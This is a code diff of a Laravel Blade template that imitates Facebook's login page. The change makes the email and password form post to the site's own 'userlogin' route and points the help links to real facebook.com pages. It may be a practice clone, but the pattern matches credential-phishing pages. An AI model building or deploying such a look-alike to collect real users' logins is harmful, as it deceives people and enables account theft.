@@ -17,12 +17,13 @@
                 <p>with the people in your life.</p>
             </div>
             <div class="fom">
-                <form action="#">
-                    <input type="email" placeholder="Email address or phone number" required>
-                    <input type="password" placeholder="Password" required class="pass">
+                <form action="{{ route('userlogin') }}" method="POST">
+                    @csrf
+                    <input type="email" name="email" placeholder="Email address or phone number" required>
+                    <input type="password" name="password" placeholder="Password" required class="pass">
                     <div class="link">
                         <button type="submit" class="login">Log in</button>
-                        <a href="#" class="forgot">Forgotten password?</a>
+                        <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" class="forgot">Forgotten password?</a>
                     </div>
                     <hr class="hr">
                     <div class="button">
@@ -30,7 +31,7 @@
                     </div>
                 </form>
                 <div class="create">
-                    <a href="">Create a Page</a> for a celebrity, brand or business.
+                    <a href="https://www.facebook.com/pages/create/?ref_type=registration_form">Create a Page</a> for a celebrity, brand or business.
                 </div>
             </div>
         </div>
